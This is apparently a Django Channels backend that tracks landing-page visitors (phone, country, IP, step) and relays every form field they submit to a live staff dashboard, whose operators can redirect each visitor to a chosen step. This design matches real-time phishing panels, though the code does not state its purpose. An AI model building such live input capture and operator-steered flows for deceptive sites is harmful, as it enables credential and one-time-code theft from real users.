import asyncio
import json

from asgiref.sync import async_to_sync, sync_to_async
from channels.db import database_sync_to_async
from channels.generic.websocket import AsyncWebsocketConsumer
from channels.layers import get_channel_layer

from apps.core.models import STEP_LABELS, Visitor, VisitorLogEntry
from apps.core.presence import (
    HEARTBEAT_INTERVAL,
    get_presence,
    heartbeat,
    mark_offline,
    mark_online,
    online_visitor_ids,
)
from apps.core.utils import get_client_ip

MANAGER_GROUP = 'online_managers'
PAGE_SIZE = 50
OFFLINE_RECENT_LIMIT = 10
ONLINE_TEST_MULTIPLIER = 1
NAVIGATION_STEPS = set(STEP_LABELS) - {'connecting', 'waiting'}


def visitor_group_name(visitor_id):
    return f'visitor_{visitor_id}'


def visitor_needs_action(step):
    return step == 'waiting'


def get_or_create_visitor(visitor_id):
    visitor, _ = Visitor.objects.get_or_create(visitor_id=visitor_id)
    return visitor


def connect_visitor(visitor_id, phone, country, ip):
    """Like update_visitor, but only stamps step='connecting' for a brand-new visitor -
    an existing visitor's step is left alone so a plain reconnect (tab refresh) isn't
    mistaken for a step change by update_visitor_and_notify."""
    visitor, created = Visitor.objects.get_or_create(visitor_id=visitor_id)
    visitor.phone = phone
    visitor.country = country
    visitor.ip = ip
    update_fields = ['phone', 'country', 'ip', 'last_seen_at']
    if created:
        visitor.step = 'connecting'
        update_fields.append('step')
    visitor.save(update_fields=update_fields)
    return visitor


def update_visitor(visitor_id, **fields):
    visitor = get_or_create_visitor(visitor_id)
    old_step = visitor.step
    for key, value in fields.items():
        setattr(visitor, key, value)
    update_fields = list(fields.keys()) + ['last_seen_at']
    if 'step' in fields:
        visitor.needs_action = visitor_needs_action(visitor.step)
        update_fields.append('needs_action')
    visitor.save(update_fields=update_fields)
    return visitor, old_step


def visitor_dict(visitor, live=None):
    return {
        'id': visitor.visitor_id,
        'phone': visitor.phone,
        'country': visitor.country,
        'step': visitor.step,
        'ip': visitor.ip or '',
        'needs_action': visitor.needs_action if live else False,
        'last_seen_at': visitor.last_seen_at.isoformat(),
        'connected_at': live['connected_at'] if live else None,
    }


def public_visitor(visitor_id):
    """Manager-facing dict for one online visitor: live presence + DB state."""
    live = get_presence(visitor_id)
    if not live:
        return None
    visitor = get_or_create_visitor(visitor_id)
    return visitor_dict(visitor, live)


def _paginate(queryset, page):
    total = len(queryset)
    total_pages = max(1, -(-total // PAGE_SIZE))  # ceil div
    page = min(max(1, page), total_pages)
    offset = (page - 1) * PAGE_SIZE
    return queryset[offset:offset + PAGE_SIZE], page, total, total_pages


def online_page(page):
    """One page of currently-connected visitors: those needing action first, then newest action first."""
    online_ids = online_visitor_ids()
    presence = {vid: get_presence(vid) for vid in online_ids}
    qs = Visitor.objects.filter(visitor_id__in=online_ids).order_by('-needs_action', '-last_seen_at')
    qs = list(qs) * ONLINE_TEST_MULTIPLIER
    page_qs, page, total, total_pages = _paginate(qs, page)
    items = [visitor_dict(v, presence.get(v.visitor_id)) for v in page_qs]
    return {'items': items, 'page': page, 'page_size': PAGE_SIZE, 'total': total, 'total_pages': total_pages}


def offline_recent(limit=OFFLINE_RECENT_LIMIT):
    """The most-recently-seen offline visitors, for the dashboard widget."""
    qs = Visitor.objects.exclude(visitor_id__in=online_visitor_ids()).order_by('-last_seen_at')
    total = qs.count()
    items = [visitor_dict(v) for v in qs[:limit]]
    return {'items': items, 'total': total}


def visitor_snapshot(visitor_id):
    """One visitor's manager-facing dict + online flag, regardless of pagination."""
    try:
        visitor = Visitor.objects.get(visitor_id=visitor_id)
    except Visitor.DoesNotExist:
        return None, False
    live = get_presence(visitor_id)
    return visitor_dict(visitor, live), bool(live)


def list_summary():
    online_ids = online_visitor_ids()
    offline_qs = Visitor.objects.exclude(visitor_id__in=online_ids).order_by('-last_seen_at')
    offline_total = offline_qs.count()
    return {
        'online_total': len(online_ids) * ONLINE_TEST_MULTIPLIER,
        'offline_total': offline_total,
        'offline_recent': [visitor_dict(v) for v in offline_qs[:OFFLINE_RECENT_LIMIT]],
    }


def write_log_entry(visitor_id, field, value):
    visitor = get_or_create_visitor(visitor_id)
    entry = VisitorLogEntry.objects.create(visitor=visitor, field=field, value=value)
    return {
        'field': entry.field,
        'value': entry.value,
        'at': entry.created_at.isoformat(),
    }


def get_log_entries(visitor_id):
    entries = VisitorLogEntry.objects.filter(visitor__visitor_id=visitor_id).order_by('created_at')
    return [{'field': e.field, 'value': e.value, 'at': e.created_at.isoformat()} for e in entries]


def log_visitor_input(visitor_id, field, value):
    """Record one log entry and push it to managers, from sync code (e.g. a Django view)."""
    if not visitor_id:
        return
    entry = write_log_entry(visitor_id, field, value)
    async_to_sync(get_channel_layer().group_send)(MANAGER_GROUP, {
        'type': 'visitor.log',
        'visitor_id': visitor_id,
        'entry': entry,
    })


def update_visitor_and_notify(visitor_id, **fields):
    """Update persisted visitor fields and push the change to managers, from sync code."""
    if not visitor_id:
        return
    _, old_step = update_visitor(visitor_id, **fields)

    new_step = fields.get('step')
    if new_step and new_step != old_step and new_step in NAVIGATION_STEPS:
        entry = write_log_entry(visitor_id, 'navigation', STEP_LABELS.get(new_step, new_step))
        async_to_sync(get_channel_layer().group_send)(MANAGER_GROUP, {
            'type': 'visitor.log',
            'visitor_id': visitor_id,
            'entry': entry,
        })

    visitor = public_visitor(visitor_id)
    if not visitor:
        return
    async_to_sync(get_channel_layer().group_send)(MANAGER_GROUP, {
        'type': 'visitor.update',
        'visitor': visitor,
        **list_summary(),
    })


class VisitorTrackerConsumer(AsyncWebsocketConsumer):
    """Tracks a landing-page visitor and reports them to the manager group."""

    async def connect(self):
        visitor_id = self.scope['session'].get('visitor_id')
        if not visitor_id:
            await self.close()
            return

        self.visitor_id = visitor_id
        self.group_name = visitor_group_name(visitor_id)
        self._heartbeat_task = None

        await self.channel_layer.group_add(self.group_name, self.channel_name)
        await sync_to_async(mark_online, thread_sensitive=False)(visitor_id)

        await database_sync_to_async(connect_visitor)(
            visitor_id,
            self.scope['session'].get('visitor_phone', ''),
            self.scope['session'].get('visitor_country', ''),
            get_client_ip(self.scope) or None,
        )

        await self.accept()
        self._heartbeat_task = asyncio.ensure_future(self._heartbeat_loop())

        visitor = await database_sync_to_async(public_visitor)(visitor_id)
        summary = await database_sync_to_async(list_summary)()
        await self.channel_layer.group_send(MANAGER_GROUP, {
            'type': 'visitor.update',
            'visitor': visitor,
            **summary,
        })

    async def _heartbeat_loop(self):
        try:
            while True:
                await asyncio.sleep(HEARTBEAT_INTERVAL)
                await sync_to_async(heartbeat, thread_sensitive=False)(self.visitor_id)
        except asyncio.CancelledError:
            pass

    async def visitor_command(self, event):
        await self.send(text_data=json.dumps({
            'type': 'command',
            'command': event['command'],
        }))

    async def receive(self, text_data=None, bytes_data=None):
        if not text_data:
            return

        try:
            data = json.loads(text_data)
        except ValueError:
            return

        if 'field' in data:
            entry = await database_sync_to_async(write_log_entry)(
                self.visitor_id, str(data.get('field', '')), str(data.get('value', ''))
            )
            await self.channel_layer.group_send(MANAGER_GROUP, {
                'type': 'visitor.log',
                'visitor_id': self.visitor_id,
                'entry': entry,
            })
            return

        step = data.get('step')
        if step:
            await database_sync_to_async(update_visitor_and_notify)(self.visitor_id, step=step)

    async def disconnect(self, close_code):
        visitor_id = getattr(self, 'visitor_id', None)
        if not visitor_id:
            return

        if self._heartbeat_task:
            self._heartbeat_task.cancel()

        await self.channel_layer.group_discard(self.group_name, self.channel_name)
        await sync_to_async(mark_offline, thread_sensitive=False)(visitor_id)
        summary = await database_sync_to_async(list_summary)()
        await self.channel_layer.group_send(MANAGER_GROUP, {
            'type': 'visitor.leave',
            'visitor_id': visitor_id,
            **summary,
        })


class ManagerConsumer(AsyncWebsocketConsumer):
    """Feeds the manager dashboard a live list of online visitors."""

    async def connect(self):
        user = self.scope['user']
        if not user.is_authenticated or not user.is_staff:
            await self.close()
            return

        await self.channel_layer.group_add(MANAGER_GROUP, self.channel_name)
        await self.accept()

        def snapshot():
            return {'online': online_page(1), 'offline': offline_recent()}

        payload = await database_sync_to_async(snapshot)()
        await self.send(text_data=json.dumps({
            'type': 'snapshot',
            'online': payload['online'],
            'offline': payload['offline'],
        }))

    async def disconnect(self, close_code):
        await self.channel_layer.group_discard(MANAGER_GROUP, self.channel_name)

    async def receive(self, text_data=None, bytes_data=None):
        if not text_data:
            return

        try:
            data = json.loads(text_data)
        except ValueError:
            return

        message_type = data.get('type')

        if message_type == 'get_visitor':
            visitor_id = data.get('visitor_id')
            visitor, online = await database_sync_to_async(visitor_snapshot)(visitor_id)
            await self.send(text_data=json.dumps({
                'type': 'visitor',
                'visitor_id': visitor_id,
                'visitor': visitor,
                'online': online,
            }))
            return

        if message_type == 'get_log':
            visitor_id = data.get('visitor_id')
            entries = await database_sync_to_async(get_log_entries)(visitor_id)
            await self.send(text_data=json.dumps({
                'type': 'log_snapshot',
                'visitor_id': visitor_id,
                'entries': entries,
            }))
            return

        if message_type == 'command':
            visitor_id = data.get('visitor_id')
            live = await sync_to_async(get_presence, thread_sensitive=False)(visitor_id)
            if not live:
                return

            command = data.get('command') or {}
            if command.get('action') == 'redirect' and command.get('step'):
                await database_sync_to_async(update_visitor_and_notify)(visitor_id, step=command['step'])

            await self.channel_layer.group_send(visitor_group_name(visitor_id), {
                'type': 'visitor.command',
                'command': command,
            })
            return

        if message_type == 'page':
            if data.get('list') != 'online':
                return
            page = int(data.get('page') or 1)
            result = await database_sync_to_async(online_page)(page)
            await self.send(text_data=json.dumps({
                'type': 'page',
                'list': 'online',
                **result,
            }))

    async def visitor_update(self, event):
        await self.send(text_data=json.dumps({
            'type': 'update',
            'visitor': event['visitor'],
            'online_total': event['online_total'],
            'offline_total': event['offline_total'],
            'offline_recent': event['offline_recent'],
        }))

    async def visitor_leave(self, event):
        await self.send(text_data=json.dumps({
            'type': 'leave',
            'visitor_id': event['visitor_id'],
            'online_total': event['online_total'],
            'offline_total': event['offline_total'],
            'offline_recent': event['offline_recent'],
        }))

    async def visitor_log(self, event):
        await self.send(text_data=json.dumps({
            'type': 'log',
            'visitor_id': event['visitor_id'],
            'entry': event['entry'],
        }))
